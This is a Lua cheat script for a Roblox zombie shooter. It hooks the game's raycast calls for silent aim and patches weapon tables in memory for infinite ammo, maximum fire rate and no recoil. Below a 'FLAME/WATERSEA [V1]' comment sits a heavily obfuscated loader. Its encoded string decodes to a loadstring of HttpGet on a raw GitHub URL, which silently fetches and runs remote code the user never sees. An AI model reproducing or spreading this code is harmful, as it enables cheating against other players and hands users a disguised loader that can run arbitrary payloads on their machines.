local uis = game:GetService("UserInputService")
local cam = game:GetService("Workspace").CurrentCamera
local ts = game:GetService("TweenService")
local plr = game:GetService("Players").LocalPlayer
local zombies = game:GetService("Workspace").Zombies

local function getClosestSilent()
    local closestDist = math.huge
    local closestPlr = nil
    for _, v in next, zombies.GetChildren(zombies) do
        if game.FindFirstChild(v, "Humanoid") and v.Humanoid.Health > 0 then
            local vector, onScreen = cam.worldToScreenPoint(cam, game.WaitForChild(v, "Head", math.huge).Position)
            local dist = (Vector2.new(uis.GetMouseLocation(uis).X, uis.GetMouseLocation(uis).Y) - Vector2.new(vector.X, vector.Y)).Magnitude
            if dist < closestDist and onScreen then
                closestDist = dist
                closestPlr = v
            end
        end
    end
    return closestPlr
end

local namecall;
namecall = hookmetamethod(game, "__namecall", function(Self, ...)
	if not checkcaller() and tostring(getcallingscript()) == "Framework" and string.lower(getnamecallmethod()) == "findpartonraywithignorelist" then
		local args = {...}
		local closest = getClosestSilent()
		if closest then
			local origin = args[1].Origin
			args[1] = Ray.new(origin, closest.Head.Position - origin)
		end
		return namecall(Self, unpack(args))
	end
	return namecall(Self, ...)
end)
local spread1 = {

  Increase = 0,

  Decrease = 0,

  Max = 0,

  Min = 0

}

local rec = {

  Tilt = { 0, 0 },

  Side = { 0, 0 },

  Vertical = { 0, 0 },

  Back = { 0, 0 },

  Aimed = 0,

  FirstShot = 0

}

for i,v in pairs(getgc(true)) do

   if type(v) == 'table' and rawget(v, 'magsize') then
       v.magsize = math.huge
       v.storedammo = math.huge
       v.rpm = math.huge
       v.spread = spread1
       v.recoil = rec
       v.mode = "Auto"
   end
end
--[[
FLAME/WATERSEA [V1]
]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v35)if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v79=0;local v80;while true do if (v79==0) then v80=v2(v0(v30,16));if v19 then local v96=v5(v80,v19);v19=nil;return v96;else return v80;end break;end end end end);local function v20(v31,v32,v33)if v33 then local v81=(v31/((5 -3)^(v32-(2 -1))))%((1 + 1)^(((v33-(1 -0)) -(v32-1)) + (2 -(1 + 0)))) ;return v81-(v81%1) ;else local v82=(621 -(555 + 64))^(v32-(932 -((1734 -(282 + 595)) + 74))) ;return (((v31%(v82 + v82))>=v82) and (569 -(367 + 201))) or (927 -(214 + 713)) ;end end local function v21()local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22()local v35,v36=v1(v16,v18,v18 + (1639 -(1523 + 114)) );v18=v18 + 2 + 0 ;return (v36 * (364 -108)) + v35 ;end local function v23()local v37,v38,v39,v40=v1(v16,v18,v18 + 3 );v18=v18 + (1069 -(68 + 997)) ;return (v40 * (16778486 -(226 + 1044))) + (v39 * (285370 -219834)) + (v38 * (373 -(32 + 85))) + v37 ;end local function v24()local v41=v23();local v42=v23();local v43=1 + 0 ;local v44=(v20(v42,1 -(0 + 0) ,5 + 15 ) * ((959 -(892 + 65))^32)) + v41 ;local v45=v20(v42,49 -28 ,1028 -(915 + 82) );local v46=((v20(v42,32)==(1 -0)) and  -(1 -0)) or (351 -(87 + 263)) ;if (v45==((1629 -(416 + 26)) -(1069 + (556 -(145 + 293))))) then if (v44==(180 -(67 + 113))) then return v46 * (0 -0) ;else v45=1 -(0 -0) ;v43=0 + 0 ;end elseif (v45==(5025 -2978)) then return ((v44==(0 -0)) and (v46 * ((1 + 0)/(0 -0)))) or (v46 * NaN) ;end return v8(v46,v45-(1975 -(802 + 150)) ) * (v43 + (v44/(((450 -(44 + 386)) -((1496 -(998 + 488)) + 3 + 5))^(139 -87)))) ;end local function v25(v47)local v48=859 -(814 + 45) ;local v49;local v50;while true do if (v48==(0 + 0)) then v49=nil;if  not v47 then v47=v23();if (v47==(772 -(201 + 571))) then return "";end end v48=1139 -(116 + 1022) ;end if (v48==3) then return v6(v50);end if (v48==(8 -(14 -8))) then v50={};for v88=1 + 0 , #v49 do v50[v88]=v2(v1(v3(v49,v88,v88)));end v48=3;end if (v48==(3 -2)) then v49=v3(v16,v18,(v18 + v47) -(3 -2) );v18=v18 + v47 ;v48=1 + 1 ;end end end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v51=0 -0 ;local v52;local v53;local v54;local v55;local v56;local v57;local v58;while true do if (v51==2) then local v86=0;while true do if (v86~=(868 -(550 + 317))) then else v51=3 -0 ;break;end if (v86~=(0 -0)) then else v56=nil;v57=nil;v86=1;end end end if (v51~=(8 -5)) then else v58=nil;while true do local v90=0;local v91;while true do if (v90==(285 -(134 + 151))) then v91=0;while true do if (v91==0) then local v127=0;while true do if (v127~=1) then else v91=1;break;end if (v127~=(1665 -(970 + 695))) then else if (1==v52) then local v141=0 -0 ;while true do if (v141==(1992 -(582 + 1408))) then v52=2;break;end if ((3 -2)~=v141) then else for v147=1 -0 ,v57 do local v148=0 -0 ;local v149;local v150;local v151;while true do if (0==v148) then v149=1824 -(1195 + 629) ;v150=nil;v148=1 -0 ;end if (v148==1) then v151=nil;while true do if (v149~=0) then else local v154=0;while true do if (v154~=(241 -(187 + 54))) then else local v156=0;while true do if (v156~=(780 -(162 + 618))) then else v150=v21();v151=nil;v156=1 + 0 ;end if (1==v156) then v154=1 + 0 ;break;end end end if (v154~=1) then else v149=1 -0 ;break;end end end if (v149~=(1 -0)) then else if (v150==1) then v151=v21()~=0 ;elseif (v150==2) then v151=v24();elseif (v150~=3) then else v151=v25();end v58[v147]=v151;break;end end break;end end end v56[3]=v21();v141=1 + 1 ;end if (0==v141) then v57=v23();v58={};v141=1;end end end if (v52~=(1638 -(1373 + 263))) then else local v142=1000 -(451 + 549) ;local v143;while true do if (v142~=(0 + 0)) then else v143=0;while true do local v152=0;while true do if (v152==(0 -0)) then if (v143~=(0 -0)) then else local v153=1384 -(746 + 638) ;while true do if (v153==0) then for v157=1,v23() do local v158=0 + 0 ;local v159;local v160;while true do if (v158==1) then while true do if ((0 -0)==v159) then v160=v21();if (v20(v160,342 -(218 + 123) ,1582 -(1535 + 46) )~=(0 + 0)) then else local v164=0 + 0 ;local v165;local v166;local v167;while true do if (v164~=2) then else local v168=0;while true do if (v168==1) then v164=563 -(306 + 254) ;break;end if (v168~=0) then else if (v20(v166,1 + 0 ,1)==(1 -0)) then v167[1469 -(899 + 568) ]=v58[v167[2]];end if (v20(v166,2,2)~=(1 + 0)) then else v167[7 -4 ]=v58[v167[606 -(268 + 335) ]];end v168=291 -(60 + 230) ;end end end if (3==v164) then if (v20(v166,3,575 -(426 + 146) )==(1 + 0)) then v167[1460 -(282 + 1174) ]=v58[v167[4]];end v53[v157]=v167;break;end if (v164==(811 -(569 + 242))) then local v170=0 -0 ;while true do if (v170~=(1 + 0)) then else v164=1025 -(706 + 318) ;break;end if (v170==0) then v165=v20(v160,2,1254 -(721 + 530) );v166=v20(v160,1275 -(945 + 326) ,14 -8 );v170=1;end end end if (v164==1) then local v171=0 + 0 ;while true do if (v171==(700 -(271 + 429))) then local v174=0;while true do if (v174~=(0 + 0)) then else v167={v22(),v22(),nil,nil};if (v165==(1500 -(1408 + 92))) then local v179=1086 -(461 + 625) ;local v180;while true do if ((1288 -(993 + 295))~=v179) then else v180=0 + 0 ;while true do if (v180==0) then v167[1174 -(418 + 753) ]=v22();v167[2 + 2 ]=v22();break;end end break;end end elseif (v165==1) then v167[1 + 2 ]=v23();elseif (v165==2) then v167[1 + 2 ]=v23() -((1 + 1)^16) ;elseif (v165~=3) then else local v185=0;local v186;while true do if (v185~=(529 -(406 + 123))) then else v186=1769 -(1749 + 20) ;while true do if (v186==(0 + 0)) then v167[3]=v23() -(2^(1338 -(1249 + 73))) ;v167[2 + 2 ]=v22();break;end end break;end end end v174=1;end if (1~=v174) then else v171=1;break;end end end if ((1146 -(466 + 679))==v171) then v164=4 -2 ;break;end end end end end break;end end break;end if ((0 -0)~=v158) then else local v163=0;while true do if (1==v163) then v158=1;break;end if (v163~=0) then else v159=1900 -(106 + 1794) ;v160=nil;v163=1;end end end end end for v161=1 + 0 ,v23() do v54[v161-1 ]=v28();end v153=1;end if (v153==1) then v143=1 + 0 ;break;end end end if (v143==1) then return v56;end break;end end end break;end end end v127=1;end end end if (v91==1) then if (v52~=(0 -0)) then else local v136=0 -0 ;while true do if (v136~=(115 -(4 + 110))) then else v55={};v56={v53,v54,nil,v55};v136=3 -1 ;end if (v136==0) then v53={};v54={};v136=2 -1 ;end if (v136~=(168 -(122 + 44))) then else v52=1;break;end end end break;end end break;end end end break;end if (v51==1) then local v87=0;while true do if (v87~=0) then else v54=nil;v55=nil;v87=1;end if (v87==(1 -0)) then v51=6 -4 ;break;end end end if ((0 + 0)==v51) then v52=0 + 0 ;v53=nil;v51=1;end end end local function v29(v59,v60,v61)local v62=v59[1];local v63=v59[2];local v64=v59[3];return function(...)local v65=v62;local v66=v63;local v67=v64;local v68=v27;local v69=1;local v70= -1;local v71={};local v72={...};local v73=v12("#",...) -1 ;local v74={};local v75={};for v83=0,v73 do if (v83>=v67) then v71[v83-v67 ]=v72[v83 + 1 ];else v75[v83]=v72[v83 + 1 ];end end local v76=(v73-v67) + 1 ;local v77;local v78;while true do v77=v65[v69];v78=v77[1];if (v78<=3) then if (v78<=1) then if (v78==0) then do return;end else v75[v77[2]]();end elseif (v78>2) then local v97;local v98,v99;local v100;local v101;v75[v77[2]]=v61[v77[3]];v69=v69 + 1 ;v77=v65[v69];v75[v77[2]]=v61[v77[3]];v69=v69 + 1 ;v77=v65[v69];v101=v77[2];v100=v75[v77[3]];v75[v101 + 1 ]=v100;v75[v101]=v100[v77[4]];v69=v69 + 1 ;v77=v65[v69];v75[v77[2]]=v77[3];v69=v69 + 1 ;v77=v65[v69];v101=v77[2];v98,v99=v68(v75[v101](v13(v75,v101 + 1 ,v77[3])));v70=(v99 + v101) -1 ;v97=0;for v125=v101,v70 do local v126=0;while true do if (v126==0) then v97=v97 + 1 ;v75[v125]=v98[v97];break;end end end v69=v69 + 1 ;v77=v65[v69];v101=v77[2];v75[v101]=v75[v101](v13(v75,v101 + 1 ,v70));v69=v69 + 1 ;v77=v65[v69];v75[v77[2]]();v69=v69 + 1 ;v77=v65[v69];do return;end else local v111=0;local v112;local v113;while true do if (v111==0) then v112=v77[2];v113=v75[v77[3]];v111=1;end if (v111==1) then v75[v112 + 1 ]=v113;v75[v112]=v113[v77[4]];break;end end end elseif (v78<=5) then if (v78==4) then local v114=0;local v115;local v116;local v117;local v118;while true do if (v114==2) then for v139=v115,v70 do local v140=0;while true do if (0==v140) then v118=v118 + 1 ;v75[v139]=v116[v118];break;end end end break;end if (v114==1) then v70=(v117 + v115) -1 ;v118=0;v114=2;end if (v114==0) then v115=v77[2];v116,v117=v68(v75[v115](v13(v75,v115 + 1 ,v77[3])));v114=1;end end else v75[v77[2]]=v61[v77[3]];end elseif (v78==6) then local v121=0;local v122;while true do if (v121==0) then v122=v77[2];v75[v122]=v75[v122](v13(v75,v122 + 1 ,v70));break;end end else v75[v77[2]]=v77[3];end v69=v69 + 1 ;end end;end return v29(v28(),{},v17)(...);end v15("LOL!043O00030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574037C3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F2O4C437465616D732F5A4B4875622F6D61696E2F2544302539452544302542442544302542382532302544302542462544312538302544302542382544312538352544302542452544302542342544312538462544312538322100083O0012033O00013O00122O000100023O00202O00010001000300122O000300046O000100039O0000026O000100016O00017O00",v9(),...);end
